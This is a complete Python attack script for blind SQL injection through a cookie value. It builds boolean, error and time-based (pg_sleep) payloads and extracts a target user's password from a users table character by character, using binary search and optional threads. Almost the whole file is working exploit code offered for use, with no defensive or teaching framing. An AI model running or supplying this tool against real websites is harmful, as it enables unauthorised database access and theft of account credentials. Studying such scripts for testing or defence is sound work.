import time
import requests
import argparse
import functools
import concurrent.futures

# constants
LOW = 33
HIGH = 126
SLEEP_FN = 'pg_sleep' # || 'SLEEP' || 'WAITFOR DELAY 0:0:0' || "dbms_pipe.receive_message((NULL), 10)"


# command line arguments
parser = argparse.ArgumentParser(
    description="""Blind SQL Injection in Cookies to get the password of users 
    when there is a table which consists of usernames and passwords"""
)

parser.add_argument('-u', '--url', type=str, required=True, metavar="\b", help='url of the website')
parser.add_argument('-t', '--type', type=str, required=True, choices=('bool', 'error', 'time'), metavar="\b", help='type of blind injection')
parser.add_argument('-f', '--cookie-field-name', type=str, required=True, metavar="\b", help='field in a cookie where sql will be injected')
parser.add_argument('-l', '--password-length', type=int, required=True, metavar="\b", help='password length')
parser.add_argument('-s', '--sleep-time', type=float, metavar="\b", 
    help='duration of database delay caused be time based injection. this option should only be used if --type=sleep'
)
parser.add_argument('-i', '--identifier-string', type=str, metavar="\b", 
    help="""string which identifies that something occured during injection, either error or change, 
    this option should only be used if --type=error or bool"""
)
parser.add_argument('--user', type=str, default='administrator', metavar="\b", help='username to retrieve information for')
parser.add_argument('--table-name', type=str, default='users', metavar="\b", help='table name to retrieve user information')
parser.add_argument('--username_field', type=str, default='username', metavar="\b", help='column name to retrieve user information')
parser.add_argument('--password_field', type=str, default='password', metavar="\b", help='column name to retrieve user information')
parser.add_argument('--threads', type=int, default=1, metavar="\b", help='number of threads to use (it must be divisor of password length)')

# parsing arguments 
args = parser.parse_args()
URL, TYPE, COOKIE_FIELD_NAME, SLEEP_TIME, IDENTIRIER_STRING, TABLE_NAME, USERNAME_FIELD, PASSWORD_FIELD, PASSWORD_LENGTH, USER, THREADS = \
    args.url, args.type, args.cookie_field_name, args.sleep_time, args.identifier_string, args.table_name, args.username_field, \
    args.password_field, args.password_length, args.user, args.threads

# argument validation
if PASSWORD_LENGTH <= 0: raise Exception('Password length must be positive integer')
if TYPE == 'time':
    assert THREADS == 1, 'Number of Threads must be one during time baased injection'
    if SLEEP_TIME == None: SLEEP_TIME = 3 
    elif SLEEP_TIME <= 0 : raise Exception('Sleep duration must be positive number')
else:
    if IDENTIRIER_STRING == None or '': raise Exception('Identifier string should not be None or empty string when TYPE is non time')
if PASSWORD_LENGTH % THREADS != 0: raise Exception('Number of threads must be divisor of password length')


# FUNCTIONS

def timeit(func):
  def inner(*args, **kwargs):
    start = time.perf_counter()
    result = func(*args, **kwargs)
    end = time.perf_counter()
    print(f'\ncode excecuted in {(end - start):.2f} seconds')
    return result
  return inner


def generate_injections(pos, num, sign):
    CONDITIONAL_BOOL = f"' || (SELECT SUBSTRING({PASSWORD_FIELD}, {pos}, 1) FROM {TABLE_NAME} WHERE "\
        f"{USERNAME_FIELD} = '{USER}') {sign} '%{format(num, 'x')}'  --"

    CONDITIONAL_ERROR = f"' || (SELECT CASE WHEN SUBSTR({PASSWORD_FIELD}, {pos}, 1) {sign} '%{format(num, 'x')}' THEN TO_CHAR(1/0) "\
        +f"ELSE 'a' END FROM {TABLE_NAME} WHERE {USERNAME_FIELD} = '{USER}') --"

    CONDITIONAL_DELAY = f"' || (SELECT CASE WHEN SUBSTRING({PASSWORD_FIELD}, {pos}, 1) {sign} '%{format(num, 'x')}' "\
        +f"THEN {SLEEP_FN}({SLEEP_TIME}) ELSE {SLEEP_FN}(0) END FROM {TABLE_NAME} WHERE {USERNAME_FIELD} = '{USER}') --"

    if TYPE == 'bool':  return CONDITIONAL_BOOL
    if TYPE == 'error': return CONDITIONAL_ERROR
    if TYPE == 'time': return CONDITIONAL_DELAY


def send_request(url, pos, sign, num):
    # Send the GET request with the injected cookies
    cookies={COOKIE_FIELD_NAME: generate_injections(pos, num, sign)}
    # print(cookies)
    response = requests.get(url, cookies=cookies)

    print(pos, '--->', f'{sign}{num}', '--->', chr(num))

    return response.content.decode().lower()


# CONDITION CHECKER FUNCTIONS
def boolean_or_error_truth_check(req):
    return IDENTIRIER_STRING in req()

def time_truth_check(req):
    start = time.perf_counter()
    req()
    duration = time.perf_counter() - start

    return duration > SLEEP_TIME


def binary_search(url, left, right, pos, password):
    while left <= right:
        mid = left + (right - left) // 2

        sign = '='
        req = functools.partial(send_request, url, pos, sign, mid)

        # depending the type of injection check function is either time based
        # or boolean-error based
        check = time_truth_check if TYPE == 'time' else boolean_or_error_truth_check

        if check(req):
            password[pos - 1] = chr(mid) 
        else:
            sign = '>'
            req = functools.partial(send_request, url, pos, sign, mid)

            if check(req): left = mid + 1  # Adjust the left boundary
            else: right = mid - 1  # Adjust the right boundary


@timeit
def get_password(url):
    password = ['*'] * PASSWORD_LENGTH

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(PASSWORD_LENGTH // THREADS): 
            for j in range(THREADS): executor.submit(binary_search, url, LOW, HIGH, i*THREADS + j + 1, password) 

    return ''.join(password)


if __name__ == '__main__':
    print(f'Password is: {get_password(URL)}')
